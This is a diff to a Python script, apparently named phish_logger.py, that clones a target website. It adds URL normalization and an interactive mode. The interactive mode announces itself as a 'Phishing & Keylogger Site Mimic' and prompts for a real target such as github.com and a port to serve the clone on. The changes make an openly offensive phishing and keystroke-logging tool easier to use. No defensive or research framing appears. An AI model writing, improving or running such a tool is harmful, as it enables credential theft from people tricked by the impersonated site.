@@ -11,7 +11,11 @@ from urllib.parse import urlparse, parse_qs, unquote
 
 class SiteMimic:
     def __init__(self, target_url, output_dir="mimic_site"):
-        self.base_url = target_url if target_url.startswith("http") else f"https://{target_url}"
+        # Normalize the URL to ensure it starts with a protocol
+        if not target_url.startswith("http"):
+            target_url = f"https://{target_url}"
+            
+        self.base_url = target_url
         self.output_dir = Path(output_dir)
         self.output_dir.mkdir(exist_ok=True)
         
@@ -272,15 +276,24 @@ def run_server(port=8080):
         httpd.server_close()
 
 def main():
-    if len(sys.argv) < 2:
-        print("Usage: python phish_logger.py <target_website_url> [port]")
-        print("Example: python phish_logger.py https://example.com 8080")
-        return
+    # Check if arguments were provided
+    if len(sys.argv) > 1:
+        target = sys.argv[1]
+        port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
+    else:
+        # Interactive mode
+        print("Phishing & Keylogger Site Mimic")
+        print("-" * 30)
+        target = input("Enter target website (e.g., github.com or https://github.com): ").strip()
+        
+        if not target:
+            print("No target provided. Exiting.")
+            return
+            
+        port_input = input("Enter port (default 8080): ").strip()
+        port = int(port_input) if port_input.isdigit() else 8080
 
-    target = sys.argv[1]
-    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
-
-    print("Phase 1: Building Website Clone...")
+    print("\nPhase 1: Building Website Clone...")
     mimicker = SiteMimic(target)
     mimicker.fetch_site(max_depth=2) # Limit depth to avoid massive crawls
 
